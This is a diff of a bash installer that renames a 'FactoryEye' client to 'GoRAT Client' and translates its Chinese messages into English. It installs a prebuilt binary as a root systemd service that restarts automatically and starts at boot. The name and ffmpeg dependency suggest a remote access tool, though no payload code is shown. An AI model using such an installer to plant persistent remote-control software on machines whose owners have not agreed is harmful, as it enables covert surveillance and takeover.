@@ -1,47 +1,41 @@
 #!/bin/bash
 
 echo "======================================="
-echo "  GoRAT - Linux安装脚本"
+echo "  GoRAT - Linux Install Script"
 echo "======================================="
 
-# 检查ffmpeg是否安装
 if ! command -v ffmpeg &> /dev/null; then
-    echo "错误: 未找到ffmpeg，请先安装ffmpeg"
+    echo "Error: ffmpeg not found, please install ffmpeg first"
     echo "Ubuntu/Debian: sudo apt install ffmpeg"
     echo "CentOS/RHEL: sudo yum install ffmpeg"
     exit 1
 fi
 
-# 检查go是否安装
 if ! command -v go &> /dev/null; then
-    echo "错误: 未找到go，请先安装go 1.20或更高版本"
+    echo "Error: go not found, please install go 1.20 or later"
     exit 1
 fi
 
-# 安装目录
-INSTALL_DIR="/opt/factoryeye"
-SERVICE_FILE="/etc/systemd/system/factoryeye.service"
+INSTALL_DIR="/opt/gorat-client"
+SERVICE_FILE="/etc/systemd/system/gorat-client.service"
 
-# 创建安装目录
-echo "创建安装目录..."
+echo "Creating install directory..."
 sudo mkdir -p $INSTALL_DIR
 
-# 复制可执行文件
-echo "复制可执行文件..."
-sudo cp factoryeye-linux $INSTALL_DIR/
-sudo chmod +x $INSTALL_DIR/factoryeye-linux
+echo "Copying executable..."
+sudo cp gorat-client-linux $INSTALL_DIR/
+sudo chmod +x $INSTALL_DIR/gorat-client-linux
 
-# 创建systemd服务文件
-echo "创建systemd服务文件..."
+echo "Creating systemd service file..."
 sudo cat > $SERVICE_FILE << EOF
 [Unit]
-Description=FactoryEye Client
+Description=GoRAT Client
 After=network.target
 
 [Service]
 Type=simple
 WorkingDirectory=$INSTALL_DIR
-ExecStart=$INSTALL_DIR/factoryeye-linux
+ExecStart=$INSTALL_DIR/gorat-client-linux
 Restart=always
 RestartSec=10
 User=root
@@ -50,24 +44,21 @@ User=root
 WantedBy=multi-user.target
 EOF
 
-# 重新加载systemd
-echo "重新加载systemd..."
+echo "Reloading systemd..."
 sudo systemctl daemon-reload
 
-# 启用服务
-echo "启用服务..."
-sudo systemctl enable factoryeye.service
+echo "Enabling service..."
+sudo systemctl enable gorat-client.service
 
-# 启动服务
-echo "启动服务..."
-sudo systemctl start factoryeye.service
+echo "Starting service..."
+sudo systemctl start gorat-client.service
 
 echo "======================================="
-echo "  安装完成!"
-echo "  服务已启动并设置为开机自启"
-echo "  安装路径: $INSTALL_DIR"
-echo "  服务名称: factoryeye.service"
-echo "  查看状态: systemctl status factoryeye.service"
-echo "  停止服务: systemctl stop factoryeye.service"
-echo "  启动服务: systemctl start factoryeye.service"
+echo "  Installation complete!"
+echo "  Service started and enabled on boot"
+echo "  Install path: $INSTALL_DIR"
+echo "  Service name: gorat-client.service"
+echo "  Check status: systemctl status gorat-client.service"
+echo "  Stop service: systemctl stop gorat-client.service"
+echo "  Start service: systemctl start gorat-client.service"
 echo "======================================="
